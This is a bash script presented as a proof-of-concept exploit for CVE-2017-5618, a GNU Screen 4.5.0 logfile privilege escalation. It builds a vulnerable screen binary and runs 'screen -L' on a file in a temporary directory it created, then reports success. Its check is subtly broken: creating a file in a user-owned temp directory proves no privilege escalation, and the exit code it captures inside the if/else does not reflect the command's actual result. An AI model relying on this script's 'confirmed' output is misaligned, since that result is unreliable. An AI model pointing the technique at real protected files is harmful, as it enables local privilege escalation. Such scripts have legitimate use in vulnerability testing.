#!/bin/bash
#
# CVE-2017-5618 Proof of Concept Exploit
# GNU Screen 4.5.0 Logfile Privilege Escalation
#

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}CVE-2017-5618 - GNU Screen Logfile Privilege Escalation${NC}"
echo -e "${BLUE}============================================================${NC}"

# Create test directory
TEST_DIR=$(mktemp -d -t screen_exploit_XXXXXX)
echo -e "${GREEN}[+] Test directory: $TEST_DIR${NC}"

# Target file for the exploit
TARGET_FILE="$TEST_DIR/protected_file.txt"
echo -e "${GREEN}[+] Target file: $TARGET_FILE${NC}"

# Build vulnerable screen if needed
VULNERABLE_SCREEN="./vulnerable-screen-4.5.0/screen"
if [[ ! -f "$VULNERABLE_SCREEN" ]]; then
    echo -e "${YELLOW}[-] Vulnerable screen binary not found. Attempting to build...${NC}"
    cd vulnerable-screen-4.5.0
    if ./configure >/dev/null 2>&1 && make >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Built vulnerable screen binary${NC}"
        cd ..
    else
        echo -e "${RED}[-] Failed to build vulnerable screen${NC}"
        cd ..
        exit 1
    fi
fi

# Attempt the exploit
echo -e "${GREEN}[+] Attempting to exploit CVE-2017-5618...${NC}"
echo -e "${GREEN}[+] Executing: $VULNERABLE_SCREEN -L $TARGET_FILE -d -m${NC}"

# The vulnerable code path: screen -L <target_file>
# This will call fopen(target_file, "w") with elevated privileges
if timeout 10s "$VULNERABLE_SCREEN" -L "$TARGET_FILE" -d -m 2>/dev/null; then
    EXPLOIT_EXIT_CODE=$?
else
    EXPLOIT_EXIT_CODE=$?
fi

echo -e "${GREEN}[+] Command exit code: $EXPLOIT_EXIT_CODE${NC}"

# Check if the file was created
if [[ -f "$TARGET_FILE" ]]; then
    echo -e "${GREEN}[+] SUCCESS: File $TARGET_FILE was created!${NC}"
    echo -e "${GREEN}[+] File permissions: $(ls -la "$TARGET_FILE")${NC}"
    EXPLOIT_SUCCESS=true
else
    echo -e "${RED}[-] File $TARGET_FILE was not created${NC}"
    EXPLOIT_SUCCESS=false
fi

# Summary
echo -e "${BLUE}\n============================================================${NC}"
if [[ "$EXPLOIT_SUCCESS" == true ]]; then
    echo -e "${GREEN}[+] VULNERABILITY CONFIRMED!${NC}"
    echo -e "${GREEN}[+] The vulnerable version allows file creation with elevated privileges${NC}"
else
    echo -e "${YELLOW}[!] Exploit may not have worked as expected${NC}"
    echo -e "${YELLOW}[!] This could be due to build issues or environment constraints${NC}"
fi

echo -e "${BLUE}\n[+] Vulnerability Details:${NC}"
echo -e "${BLUE}    - CVE: CVE-2017-5618${NC}"
echo -e "${BLUE}    - Affected: GNU Screen 4.5.0 and earlier${NC}"
echo -e "${BLUE}    - Fixed in: GNU Screen 4.5.1${NC}"
echo -e "${BLUE}    - Impact: Privilege escalation via logfile creation${NC}"

# Cleanup
echo -e "${GREEN}\n[+] Cleaning up...${NC}"
rm -rf "$TEST_DIR"
echo -e "${GREEN}[+] Done!${NC}"